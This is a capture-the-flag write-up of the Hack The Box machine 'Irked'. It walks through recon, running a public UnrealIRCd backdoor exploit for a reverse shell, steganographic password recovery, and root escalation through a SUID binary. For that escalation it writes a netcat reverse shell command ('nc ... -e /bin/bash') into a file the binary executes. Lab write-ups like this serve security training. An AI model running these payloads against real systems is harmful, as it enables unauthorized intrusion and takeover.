# Irked [htb](https://app.hackthebox.com/machines/163)
![irked-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/irked-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 irked.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/ports-02.png)


Let's run a version detection scan againts these ports:

```bash
nmap -p 22,80,111,6697,8067,51499,65534 -sCV irked.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.10 server on port 80.
+ An rpcbind service on port 111.
+ An UnrealIRCd service on ports 6697, 8067, 65534.
+ An rpc program on port 51499.


We have a few interesting services on this target. Primarly, we have a custom application, `UnrealIRCd` on a few different ports. We also have an rpc portmapper on port 111, and what looks like a custom rpc program on port 51499. We will take a look at both.


We also have an SSH server and an Apache server on the target. Based on the ssh probing, `nmap` guessed that the target OS is probably a Debian based system. 


Let's start with the rpc. 


## RPC Port 111 & 51499


The RPC portmapper is a service responsible for routing requests from remote clients to the correct services. Many services can be run in this manner, an exploitable service that is commonly set via RPC is [NFS](https://en.wikipedia.org/wiki/Network_File_System) for example. 


The `nmap` scripting engine already probed the rpc portmapper for the available services it offers, though we can also query this manually using:

```bash
rpcinfo -p irked.htb
```

![rpcinfo-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/rpcinfo-04.png)


The output is similar to what `nmap` found. Though in this case, we also see a service on 49487/udp, which I guess is the same service that runs on 51499/tcp. 


The service is named `status` and if we try to connect to it nothing happens, It just stalls indefinitely:

```bash
nc 10.129.172.93 51499
```

![nc-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/nc-05.png)


At the moment I dont see a clear way of exploting this, we dont have a service like NFS running via the rpc. Instead, I beleive that this RPC service has something to do with the `UnrealIRCd` service we saw in the nmap scan, though I'm not sure at the moment. 


Instead, I decided to have a look at the Apache server to see what information it might reveal to us. After that we'll take a look at the `UnrealIRCd` service. 


## Apache Port 80

If we open the site at `http://irked.htb/` we're greeted with the following:

![site-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/site-06.png)


The text at the buttom says `IRC is almost working!`, though outside of that there isn't much to see or do in this page. 


At this point I ran a directory and file scan using `ffuf` and a sub-domain scan with `wfuzz`, but nothing meaningul came from it. So I decided to move on to the `UnrealIRCd` service.



## UnrealIRCd Port 6697, 8067 & 65534

Let's start by answering the following question: What is `UnrealIRCd`?

+ [UnrealIRCd](https://en.wikipedia.org/wiki/UnrealIRCd#Features) is an open source IRC daemon available for Unix-like operating systems and Windows.
+ [IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat), or Internet Relay Chat is a text-based chat system for instant messaging.


IRC has two forms of users: operators and ordinary users. To login to the server as an ordinary user we can simply register with a random nickname. But in order to login as an operator we need both a username and a password.  


Let's try to connect to the chat server and register as a user with `htb : htb` as the credentials.

```bash
nc -vn 10.129.172.93 6697

USER htb 0 * htb
NICK htb
```

![connect-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/connect-07.png)


After we succesfully register, the server prints a lengthy banner, but between the lines we can see the version of the UnrealIRCd service which is `3.2.8.1`. I did a quick google search for exploits and I found an RCE exploit on [Github](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor). 


If we take a look at the source code we can see its a Python script. The script utilizes the `sockets` module to connect to the server on the specified port and ip values. After that there are three main types of reverse shell payloads being defined:

![payloads-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/payloads-08.png)


The selected payload then gets base64 encoded as defined in the `gen_payload` function:

![gen-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/gen-09.png)


The fucntion also wraps the base64 encoded payload inside the proper bash commands to decode the base64 encoding and pipe the clean payload into `/bin/bash`. This is a known technique for safely passing payloads through different sockets/services. 


After connecting to the server the script will send the selected payload using the `AB` command:

![send-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/send-10.png)


What we dont see in the exploit, is user registration/authentication to the chat server, maybe it's not needed? We also dont see any mechanism of catching the reverse shell, so we'll have to do that ourselfes. All in all, the exploit looks good, let's try it out. 


After downloading the exploit to our attack machine, we need to setup the local ip and port for the reverse shell payload:

![edit-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/edit-11.png)


The exploit should be ready now, so I saved the exploit and addeed execute permissions with `chmod +x exploit.py`. 


The next step is to setup the listener for the reverse shell:

```bash
rlwrap nc -lnvp 9001
```

And execute:

```bash
./exploit.py -payload bash 10.129.172.93 6697
```

After a couple of seconds I get a connection back on my listener:

![shell-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/shell-12.png)


Nice! Let's move to privesc! 


## Privilege Escalation


When we land on the machine, we get access as the user who runs the `UnrealIRCd` program, which in the case of this box, is a dedicated user `ircd`. There is another user account on the system:

![user-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/user-13.png)


From the above output we can see our user has read permissions to `djmardov`'s home directory. So I decided to look around he's home folder, and that's where I found the following:

```bash
cd /home/djmardov
ls -al Documents
```

![docs-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/docs-14.png)


There is a hidden `.backup` file and it's readable by everyone, so let's read it:

![pass-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/pass-15.png)


This looks like the user's password. Lets try to login via the ssh with it:

![fail-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/fail-16.png)


No luck. 


The first line says `Super elite steg backup pw`, could this be refering to steganography? We know that we had an interesting image in the Apache server, could it be hiding something? 


Let's download it to our attack machine and have a look. 


```bash
wget http://irked.htb/irked.jpg    # Download the image
```

At first I tried running tools like `binwalk` and `exiftool` on the image but nothing came from it. I did a bit of research online and I found that the tool `steghide` can extract/embeed information from files. this also fits the line from the file. 


To extract information from a password protected file, we can run something like this:

```bash
steghide extract -sf irked.jpg  -p UPupDOWNdownLRlrBAbaSSss
```

![extract-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/extract-17.png)


Looks like it worked! Let's check the `pass.txt` file:

![pw-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/pw-18.png)


Let's try to login to the ssh again:

![user-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/user-19.png)


Nice! 


### Djmardov


Once I connected to the ssh I immediately checked for any sudo permissions:

```bash
sudo -l
```

![sudo-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/sudo-20.png)


No luck. Instead, I tried to look for other easy wins like any SUID binaries with:

```bash
find / -perm -4000 2>/dev/null
```

Which brought an interesting result:

![suid-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/suid-21.png)


This is an unknown binary with a SUID bit set? Let's get a bit more information about this file, like it's type and permissions:

![check-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/check-22.png)


It's owned by root, therfore when it is being run, it will run under root. We can also see the file is an executable binary. 


Lets try to run it:

![run-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/run-23.png)


The program says that it is developed to set and test user permissions and that, it is still being developed. We can also see what looks like the output from the `who` command, which lists users with active sessions on the system. at the end we can see the program tried to access `/tmp/listusers` which doesnt exits.


Let's try to run `strace` and `ltrace` on it:

![strace-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/strace-24.png)


No luck, I ran `strings` on the program as well, but this didn't reveal anything super useful. I also tried to run the program with a username as an argument, like `/usr/bin/viewuser djmardov`, the output remained the same. 


Maybe we should put a username inside the `/tmp/listusers` file? Lets try to add `root`:

```bash
echo 'root' > /tmp/listusers
```

![err-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/err-25.png)


Permissions denided? what did the program try to do with the file? lets add full permissons and run it again:

![err-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/err-26.png)


A `root: not found` error? this looks like the error bash raises when you try to run a program that doesnt exists on the system. Could this program be running `/tmp/listusers` as a script?


Let's add a reverse shell payload with:

```bash
echo 'nc 10.10.14.58 8888 -e /bin/bash' > /tmp/listusers
```

![payload-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/payload-27.png)


Setup a local listener on our attack machine:

```bash
rlwrap nc -lnvp 8888
```

And run the program again:

![stalls-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/stalls-28.png)


It stalls, that's a great sign. Let's check the listner:

![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Irked/img/root-29.png)


We get a connection back as root, but the connection is not a true TTY shell. We can fix this by running:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
